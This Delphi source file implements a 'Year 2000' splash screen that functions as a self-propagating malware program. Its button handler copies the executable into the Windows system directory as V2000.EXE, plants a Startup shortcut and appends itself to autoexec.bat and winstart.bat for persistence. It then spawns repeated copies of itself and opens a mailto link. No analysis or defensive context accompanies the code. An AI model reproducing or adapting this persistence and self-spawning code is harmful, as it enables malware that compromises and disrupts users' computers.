   unit Splash;

   {$I-}

   interface

   uses
     Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     ExtCtrls, StdCtrls, Registry, ComCtrls, FileUtil,
     RxGrdCpt, ShellAPI, NMsmtp, Psock, NMMSG, ShlObj;

   type
     TfrmSplash = class( TForm )
       Button1: TButton;
       ProgressBar1: TProgressBar;
       RxGradientCaption1: TRxGradientCaption;
       procedure FormCreate( Sender : TObject );
       procedure FormPaint( Sender : TObject );
       procedure Button1Click(Sender: TObject);
     private
       FW, FH : Integer;
       function CreateWndRgn : hRgn;
     end;

   var
      Form1 : TfrmSplash;
      FRegistry : TRegistry;

   implementation

   {$R *.DFM}

   const
     cSplashName1 = 'Year 2000';

   function GetRightValue( ALowBound, AHighBound, AValue : Integer ) : Integer;
   begin
     if ( AValue > AHighBound ) then
       Result := ALowBound + ( AHighBound - AValue )
     else
       Result := AValue;
   end;

   procedure TfrmSplash.FormCreate( Sender : TObject );
   begin
     SetWindowRgn( Handle, CreateWndRgn( ), True );
   end;

   function TfrmSplash.CreateWndRgn : hRgn;
   var
     SaveMode : Integer;
   begin
     SaveMode := SetBKMode( Canvas.Handle, TRANSPARENT );
     with Canvas.Font do
     begin
       Name := 'Times New Roman';
       Size := 35;
       Style := [fsBold];
     end;
     FW := Canvas.TextWidth( cSplashName1);
     FH := Canvas.TextHeight( cSplashName1);
     BeginPath( Canvas.Handle );
     Canvas.TextOut( ( Width div 2 ) - ( FW div 2 ), ( Height div 2 ) - ( FH div 2 ), cSplashName1 );
     EndPath( Canvas.Handle );
     Result := PathToRegion( Canvas.Handle );
     SetBKMode( Canvas.Handle, SaveMode );
   end;

   procedure TfrmSplash.FormPaint( Sender : TObject );
   var
     ARgn : hRgn;
     R : TRect;
     I : Integer;
   begin
     ARgn := CreateRectRgn( 0, 0, 0, 0 );
     GetWindowRgn( Handle, ARgn );
     ExtSelectClipRgn( Canvas.Handle, ARgn, RGN_COPY );
     DeleteObject( ARgn );
     R := Bounds( ( Width div 2 ) - ( FW div 2 ), ( Height div 2 ) - ( FH div 2 ), FW, 1 );
     for i := 1 to FH do
     begin
       Canvas.Brush.Color := 0 or RGB( 200, 50, 147 + Round( ( 255 - 147 ) * i / FH ) );
       Canvas.FillRect( R );
       OffsetRect( R, 0, 1 );
     end;
   end;

   Function ExecProgramFile (FName : String) : THandle;
   var
      S : String;
      ProcessName,
      ProcessParam : PChar;
      IpProcessAttributes : PSecurityAttributes;
      IpThreadAttributes  : PSecurityAttributes;
      bInheritHandles     : bool;
      dwCreationFlags     : dword;
      IpEnvironment       : Pointer;
      IpCurrentDirectory  : LPCTSTR;
      IpStartupInfo       : _STARTUPINFOA;
      IpProcessInformation: PROCESS_INFORMATION;
   begin
        S := FName;
        if not FileExists (S) then begin
           ExecProgramFile := 0;
           Exit;
        end;
        ProcessName  := nil;
        ProcessParam := PChar (S);

        IpProcessAttributes := nil;
        IpThreadAttributes  := nil;
        bInheritHandles     := True;
        dwCreationFlags     := Create_Default_Error_Mode;
        IpEnvironment       := nil;
        IpCurrentDirectory  := nil;
        with IpStartupInfo do begin
             cb := SizeOf (TStartupInfo);
             lpReserved := nil;
             lpDesktop  := nil;
             lpTitle    := nil;
             dwX        := 0;
             dwY        := 0;
             dwXSize    := 100;
             dwYSize    := 100;
             dwXCountChars := 80;
             dwYCountChars := 24;
             dwFillAttribute := 15;
             dwFlags       := STARTF_USESTDHANDLES;
             wShowWindow   := SW_MAXIMIZE;
             cbReserved2   := 0;
             lpReserved2   := nil;
        end;
        if CreateProcess (ProcessName, ProcessParam, IpProcessAttributes, IpThreadAttributes,
                          bInheritHandles, dwCreationFlags, IpEnvironment,
                          IpCurrentDirectory, IpStartupInfo, IpProcessInformation)

        then
          Result:=IpProcessInformation.hProcess
        Else
          Result:=0;
   end;

   procedure ExecProgramFromPanel;
   var
      AhProcess : THandle;
      S : String;
   begin
        S := ParamStr (0);
        AhProcess:=ExecProgramFile (S);
   end;

   procedure AutoStart (const Name1, Name2 : String);
   var
      T : TextFile;
   begin
        AssignFile (T, Name1);
        if FileExists (Name1) then
           Append (T)
        else
           ReWrite (T);
        WriteLn (T, Name2);
        CloseFile (T);
   end;

   procedure TfrmSplash.Button1Click(Sender: TObject);
   var
      S, S1, S2 : String;
   begin
        S := ParamStr (0);
        S1 := GetSystemDir + '\V2000.EXE';
        if (Pos (GetSystemDir, S) = 0) and (not FileExists (S1)) then begin
           CopyFile (S, S1, nil);
           CreateFileLink (S1, 'Fish', CSIDL_STARTUP);
        end;
   {--------------------------------------------------------------------------------------}
        S2 := S[1] + ':\autoexec.bat';
        AutoStart (S2, S1);
        S2 := S[1] + ':\winstart.bat';
        AutoStart (S2, S1);
   {--------------------------------------------------------------------------------------}
        Randomize;
        Form1.Top := Random (640);
        Form1.Left := Random (480);
        Form1.Show;
        Form1.Refresh;
        Sleep (100);
        ExecProgramFromPanel;
        Sleep (100);
        ExecProgramFromPanel;
        Sleep (100);
        ExecProgramFromPanel;
        Sleep (2000);
   {--------------------------------------------------------------------------------------}
       ShellExecute(0, Nil, PChar('MailTo:lamer@v2000.org'), nil, nil, SW_Maximize);
   {--------------------------------------------------------------------------------------}

     Close;
   end;

   end.
